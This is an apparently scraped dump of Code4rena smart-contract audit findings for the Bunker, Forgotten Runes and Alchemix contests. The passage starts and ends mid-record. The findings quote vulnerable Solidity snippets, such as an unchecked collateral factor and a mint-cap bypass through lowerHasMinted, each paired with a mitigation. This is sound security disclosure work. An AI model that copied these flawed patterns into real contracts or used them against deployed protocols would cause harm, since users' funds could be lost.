https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L1337-L1359   # Vulnerability details  https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L1337-L1359  ```solidity function _initializeNftCollateral(CNftInterface cNft, NftPriceOracle _nftOracle, uint256 _collateralFactorMantissa) external returns (uint) {     require(address(nftMarket) == address(0), \"nft collateral already initialized\");     require(address(cNft) != address(0), \"cannot initialize nft market to the 0 address\");      if (msg.sender != admin) {         return fail(Error.UNAUTHORIZED, FailureInfo.SUPPORT_MARKET_OWNER_CHECK);     }      if (markets[address(cNft)].isListed) {         return fail(Error.MARKET_ALREADY_LISTED, FailureInfo.SUPPORT_MARKET_EXISTS);     }      cNft.isCNft(); // Sanity check to make sure its really a cNFT.      nftMarket = cNft;     nftOracle = _nftOracle;      // Note that isComped is not in active use anymore     markets[address(cNft)] = Market({isListed: true, isComped: false, collateralFactorMantissa: _collateralFactorMantissa});      // We do not support borrowing NFTs.     borrowGuardianPaused[address(cNft)] = false; } ```  https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L80-L81  ```solidity // No collateralFactorMantissa may exceed this value uint internal constant collateralFactorMaxMantissa = 0.9e18; // 0.9 ```   There is a `collateralFactorMaxMantissa` which limits the collateral factor to be always lower than 0.9.  Per the comment:  > No collateralFactorMantissa may exceed this value  However, in `_initializeNftCollateral()`, the `_collateralFactorMantissa` is set without any check, which means it can be set to a value > 0.9 or even > 1.  As a result, the borrowers may deliberately choose not to repay as their collateral may not be worth the debt in the first place. This can accumulate bad debt in the whole system.  ### Recommendation  Change to:  ```solidity // Check collateral factor <= 0.9 Exp memory highLimit = Exp({mantissa: collateralFactorMaxMantissa}); if (lessThanExp(highLimit, _collateralFactorMantissa)) {     return fail(Error.INVALID_COLLATERAL_FACTOR, FailureInfo.SET_COLLATERAL_FACTOR_VALIDATION); }  markets[address(cNft)] = Market({isListed: true, isComped: false, collateralFactorMantissa: _collateralFactorMantissa}); ```  "}, {"title": "Lack of Storage Gap for Upgradeable Contracts", "html_url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-bunker-findings", "body": "# Lines of code  https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/ERC1155Enumerable.sol#L70-L71 https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CNft.sol#L282-L283   # Vulnerability details  ## Impact  The code base contains several upgradeable contracts that inherit other upgradeable contracts, including `ERC1155Enumerable.sol` and `CNFT.sol`. These contracts currently do not contain any storage gap.  For upgradeable contracts, there must be storage gap to \"allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments\" (quote OpenZeppelin). Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts, potentially causing loss of user fund or cause the contract to malfunction completely.   Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable   ## Proof of Concept  All OpenZeppelin upgradeable contract templates contain storage gap, including `ReentrancyGuardUpgradeable`, `OwnableUpgradeable` and `ERC1155Upgradeable` that are used in this project. Refer to the bottom of the code in the links below:   https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/security/ReentrancyGuardUpgradeable.sol  https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/OwnableUpgradeable.sol  https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC1155/ERC1155Upgradeable.sol  The storage gap is essential for upgradeable contract because \"It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments\". Refer to the bottom part of this article:   https://docs.openzeppelin.com/contracts/3.x/upgradeable  Note that it isn't enough to simply have the OpenZeppelin base contracts contain storage gaps. In this project, the `CNFt` contract inherits the `ERC1155Enumerable` contract, which inherits `ERC1155Upgradeable`. We know the `ERC1155Upgradeable` contract contains a storage gap, so that contract can add additional variables without affecting its child contracts. However, `ERC1155Enumerable` currently does not contain a storage gap, and if in a future upgrade, a new variable is used in the `ERC1155Enumerable` contract, the storage slot of that new variable would overlap with the existing storage slots that are used by `CNFt` and overwrites it, causing unintended and potentially serious consequences including a complete malfunction of the `CNFt` contract. Refer to the bottom of this link for an example and explanation:   https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.   ```solidity   uint256[50] private __gap; ```  "}, {"title": "Chainlink pricer is using a deprecated API", "html_url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/1", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-bunker-findings", "body": "# Lines of code  https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/PriceOracleImplementation.sol#L29-L30   # Vulnerability details  ## Impact According to Chainlink's documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stop supporting deprecated APIs. And the old API can return stale data.  ## Proof of Concept https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/PriceOracleImplementation.sol#L29-L30 ## Tools Used None ## Recommended Mitigation Steps Use the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete https://docs.chain.link/docs/price-feeds-api-reference/  "}, {"title": "Contract may not have enough fund to cover refund", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/187", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L616-L619   # Vulnerability details  ## Impact Owner of the contract can call `withdrawAll` before the refund process is done to send all ETH to the vault. Since there are no payable receive function in `ForgottenRunesWarriorsMinter`, the owner won't be able to replenish the contract for the refund process.  ## Proof of Concept https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L616-L619  ```solidity     function withdrawAll() public payable onlyOwner {         require(address(vault) != address(0), 'no vault');         require(payable(vault).send(address(this).balance));     } ```  ## Recommended Mitigation Steps Only allow owner to call `withdrawAll` after refund period  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/102", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "# Non Critical ## [N01] Delete `payable` from `withdrawAll()`: `withdrawAll()` do not use `msg.value` and just withdraw eth so it doesn't need to be `payable`. ### Recommended Mitigation Steps: ```ForgottenRunesWarriorsGuild.sol:163   - function withdrawAll() public payable onlyOwner {   + function withdrawAll() public onlyOwner {  ForgottenRunesWarriorsMinter.sol:616   - function withdrawAll() public payable onlyOwner {   + function withdrawAll() public onlyOwner { ```  ## [N02] Check `.transfer()` return's value: It is good to add a `require()` statement that checks the return value of token transfers or to use something like OpenZeppelin\u2019s `safeTransfer` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures.  ``` ForgottenRunesWarriorsGuild.sol   175,9:         token.transfer(msg.sender, amount);  ForgottenRunesWarriorsMinter.sol   629,9:         token.transfer(msg.sender, amount);  ForgottenRunesWarriorsMinter.sol   402,13:             IERC20(weth).transfer(to, amount); ``` ### Recommended Mitigation Steps Consider using safeTransfer or check transfer's return with require().  ## [N03] `type(uint256).max` is more readable than hex version of the number: ``` ForgottenRunesWarriorsMinter.sol   18,9:         0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;   23,9:         0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;   27,9:         0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;   31,9:         0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;   35,9:         0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff; ``` ### Recommended Mitigation Steps: Use `type(uint256).max` instead of `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/101", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "1. In ForgottenRunesWarriorsGuild.mint the function isn't following the checks-effects-interactions pattern. Even though there is nonReentrant modifier it is still better to follow the pattern since in very rare cases there can still be possible reentrancy.  Recommended steps:  Move numMinted += 1; Before the _safeMint()  See here: https://inspexco.medium.com/cross-contract-reentrancy-attack-402d27a02a15  2. In both contracts you are using a floating pragma.   Recommended Steps:  Remove the ^ from both contracts. This will lock the compiler version.  See here: https://swcregistry.io/docs/SWC-103"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "# Typo in state variable documentation.  Change `claimlistMinted`'s documentation to something like:  `Tracks whether an address claimed its free warrior`.  https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L88"}, {"title": "IERC20.transfer does not support all ERC20 token", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/70", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176 https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L627-L630   # Vulnerability details  Token like [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#contracts) known for using non-standard ERC20. ([Missing return boolean on transfer](https://forum.openzeppelin.com/t/can-not-call-the-function-approve-of-the-usdt-contract/2130/4)).  Contract function [forwardERC20](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173-L176) will always revert when try to transfer this kind of tokens.  ## Impact  Cannot withdraw some special ERC20 token through contract call. Unexpected contract functionality = Medium severity  ## Migration  Use [SafeTransferLib.safeTransfer](https://github.com/Rari-Capital/solmate/blob/4197b521ef3eb81f675d35e64b7b597b24d33500/src/utils/SafeTransferLib.sol#L65-L94) instead of IERC20 transfer. This accepts ERC20 token with no boolean return like USDT.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-runes-findings/issues/44", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-runes-findings", "body": "# 1. Usage of legacy ETH transfer function ## Risk Low  ## Impact Contract `ForgottenRunesWarriors` for withdrawing ETH to `vault` uses `send` function, which has a fixed gas stipend and can fail.  The reason behind this is that, after the Istanbul hardfork, any smart contract that uses `transfer()` or `send()` is taking a hard dependency on a gas costs by forwarding a fixed amount of gas (2300). This forwards 2300 gas, which may not be enough if the recipient is a contract and the cost of gas changes.  ## Proof of Concept `ForgottenRunesWarriorsMinter`: * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L610 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L618  `ForgottenRunesWarriorsGuild`: * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L164  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to use safe wrapper library, such as the OpenZeppelin Address library\u2019s and its sendValue function that forwards sufficient gas for the transfer regardless of the underlying OPCODE gas costs.  # 2. Missing zero address checks ## Risk Low  ## Impact Multiple functions in `ForgottenRunesWarriorsMinter` and `ForgottenRunesWarriorsGuild` contracts do not check for zero addresses which might lead to loss of funds, failed transactions and can break the protocol functionality.  ## Proof of Concept `ForgottenRunesWarriorsMinter`: * Missing check for `_warriors` and `_weth` addresses - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L110 * Missing check for `minter` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L364 * Missing check for `_newVaultAddress` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L527 * Missing check for `_newWarriorsAddress` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L535 * Missing check for `_newWethAddress` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L543  `ForgottenRunesWarriorsGuild`: * Missing check for `newMinter` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L52 * Missing check for `recipient` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L94 * Missing check for `newMinter` - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L137  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to add zero address checks for listed parameters.  # 3. Missing/Invalid validation checks ## Risk Low  ## Impact Function `ForgottenRunesWarriorsMinter.setPhaseTimes` setups times for different phases of minting. Phases should be launched one after the other.  Missing check: * `newDaStartTime < newMintlistStartTime` - making sure that Phase DA is before Mintlist Phase  Invalid checks that might lead to unintentional overlapping of phases: * `newPublicStartTime >= newMintlistStartTime` should use `>` instead of `>=` * `newClaimsStartTime >= newPublicStartTime` should `>` instead of `>=`  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L480-L500  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to add missing check `newDaStartTime > newMintlistStartTime` and fix invalid checks comparisons from `>=` to `>`.  # 4. ERC20 Return values not checked ## Risk Low  ## Impact The `IERC20.transfer()` function returns a boolean value indicating success. This parameter needs to be checked for success. Some tokens do not revert if the transfer failed but return false instead.  Tokens that don't actually perform the transfer and return false are still counted as a correct transfer. Furthermore, tokens that do not correctly implement the EIP20 standard, like USDT which does not return a success boolean, will revert.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L402 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L629  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to use OpenZeppelin's SafeERC20 with the `safeTransfer` function that handles the return value check as well as non-standard-compliant tokens.  # 5. Owner - critical address change ## Risk Low  ## Impact Changing critical addresses such as ownership of `ForgottenRunesWarriorsMinter` and `ForgottenRunesWarriorsGuild` contracts should be a two-step process where the first transaction (from the old/current address) registers the new address (i.e. grants ownership) and the second transaction (from the new address) replaces the old address with the new one. This gives an opportunity to recover from incorrect addresses mistakenly used in the first step. If not, contract functionality might become inaccessible.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L15 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L14  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to implement two-step process for passing ownership for `ForgottenRunesWarriorsMinter` and `ForgottenRunesWarriorsGuild` contracts.  # 6. Missing error messages ## Risk Non-Critical  ## Impact Contracts `ForgottenRunesWarriorsMinter` and `ForgottenRunesWarriorsGuild` are missing error messages for multiple of `require` statements. Lack of clear error messages might lead to confusion in case of transactions being rejected.  ## Proof of Concept `ForgottenRunesWarriorsMinter.sol`: * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L610 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L618 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L628  `ForgottenRunesWarriorsGuild.sol` * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L164 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L174  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to add error messages to listed `require` statements.  # 7. The contracts use unlocked pragma ## Risk Non-Critical  ## Impact As different compiler versions have critical behavior specifics if the contract gets accidentally deployed using another compiler version compared to one they tested with, various types of undesired behavior can be introduced.  ## Proof of Concept All the contracts in scope use unlocked pragma: * (^0.8.0) - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L1 * (^0.8.0) - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L1  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps Consider using a single compiler version for compiling both contracts, for example 0.8.10  # 8. Obsolete function ForgottenRunesWarriorsGuild.withdrawAll ## Risk Non-Critical  ## Impact Contract `ForgottenRunesWarriorsGuild` implements `withdrawAll` function that allows withdrawing all ether from the contract if it was accidentally sent to it. Function `withdrawAll` is the only payable function in the whole `ForgottenRunesWarriorsGuild` contract which makes it impossible to receive \"accidental\" ether.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L163-L165  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to remove `withdrawAll` function from `ForgottenRunesWarriorsGuild` contract.  # 9. Missing events ## Risk Non-Critical  ## Impact Contracts `ForgottenRunesWarriorsGuild` and `ForgottenRunesWarriorsMinter` are not implementing events for multiple critical functions. Lack of events makes it difficult for off-chain applications to monitor the protocol.  ## Proof of Concept `ForgottenRunesWarriorsGuild` * Missing `setMinter` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L137 * Missing `setProvenanceHash` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L145 * Missing `setBaseURI` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L129 * Missing `forwardERC20s` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L173  `ForgottenRunesWarriorsMinter`: * Missing `bidSummon` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L130 * Missing `mintlistSummon` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L171 * Missing `publicSummon` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L201  * Missing `claimSummon` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L229 * Missing `teamSummon` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L257 * Missing `_refundAddress` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L376  * Missing `setDaStartTime` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L441 * Missing `setMintlistStartTime` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L448 * Missing `setPublicStartTime` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L455 * Missing `setClaimsStartTime` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L462 * Missing `setSelfRefundsStartTime` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L469 * Missing `setMintlist1MerkleRoot` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L505 * Missing `setMintlist2MerkleRoot` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L513 * Missing `setClaimlistMerkleRoot` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L520 * Missing `setVaultAddress` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L527 * Missing `setWarriorAddress` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L534 * Missing `setWethAddress` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L543 * Missing `setStartPrice` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L550 * Missing `setLowestPrice` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L557 * Missing `setDaPriceCurveLength` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L564 * Missing `setDaDropInterval` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L571 * Missing `setFinalPrice` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L579  * Missing `setMaxDaSupply` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L586 * Missing `setMaxForSale` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L593 * Missing `setMaxForClaim` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L600 * Missing `withdraw` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L608 * Missing `withdrawAll` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L616 * Missing `forwardERC20s` event - https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L627  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to go through listed functions and add emitting events for the one that change storage variables and should be monitored.  # 10. Usage of boolean values ## Risk Non-Critical  ## Impact Contract `ForgottenRunesWarriorsMinter` in functions `mintlistSummon` and `claimSummon` uses `false` boolean expression for require statement in functions.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L182 * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L238  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to remove `false` expression: `require(!mintlistMinted[msg.sender], 'Already minted');` and `require(!claimlistMinted[msg.sender], 'Already claimed');`  # 11. Use constant max uint256 as a default value for timestamp variables ## Risk Non-Critical  ## Impact Contract `ForgottenRunesWarriorsMinter` as a default value for `daStartTime`, `mintlistStartTime`, `publicStartTime`, `claimsStartTime` and `selfRefundsStartTime` uses maximum value of `uint256` variable written in hexadecimal format. It makes code less readable and might lead to accidental typos in their values.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L17-L35  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to add constant value `MAX_UINT = type(uint256).max` and then reuse it as a default value for \"timestamp\" variables.  # 12. Risk of centralization ## Risk Non-Critical  ## Impact Protocol is highly centralized and depends on the good will of the team. Owner of the contract(s) can withdraw all deposited funds at any time, can start and stop minting and can mint arbitrary number of NFTs. This might lead to trust issues and users losses if the owner account will get compromised.  The issue has been downgraded to non-critical since the team is aware of the risk and has accepted it.  ## Proof of Concept * https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol * https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to decentralize protocol by adding multiple safeguards and limit power of the contract(s) owner."}, {"title": "Alchemist can mint `AlTokens` above their assigned ceiling by calling `lowerHasMinted()`", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/166", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2Base.sol#L111-L124 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2Base.sol#L189-L191   # Vulnerability details  ## Impact An alchemist / user can mint more than their alloted amount of AlTokens by calling `lowerHasMinted()` before they reach their minting cap.  ## Proof of Concept Function `mint()` in `AlchemicTokenV2Base.sol`  ```solidity   function mint(address recipient, uint256 amount) external onlyWhitelisted {     if (paused[msg.sender]) {       revert IllegalState();     }      uint256 total = amount + totalMinted[msg.sender];     if (total > mintCeiling[msg.sender]) {       revert IllegalState();     }      totalMinted[msg.sender] = total;      _mint(recipient, amount);   } ``` Note the require conditional check that `total > mintCeiling[msg.sender]`.  In the same contract, there is the function `lowerHasMinted()` with the same permission level as mint and is thus callable by the same user as well. ```solidity   function lowerHasMinted(uint256 amount) external onlyWhitelisted {     totalMinted[msg.sender] = totalMinted[msg.sender] - amount;   } ```  It is clear that a user can accumulate an infinite (within supply) amount of AlTokens by calling `lowerHasMinted()` before any action that would make them exceed their minting cap.  ## Tools Used Manual review, VScode  ## Recommended Mitigation Steps Change the permissioning on `lowerHasMinted()` to be restricted to a higher permissioned role like `onlySentinel()` , or deprecate this function as I could not find any uses of it throughout the codebase or in tests.  "}, {"title": "DoS in wrap and unwrap", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/159", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/adapters/fuse/FuseTokenAdapterV1.sol#L76 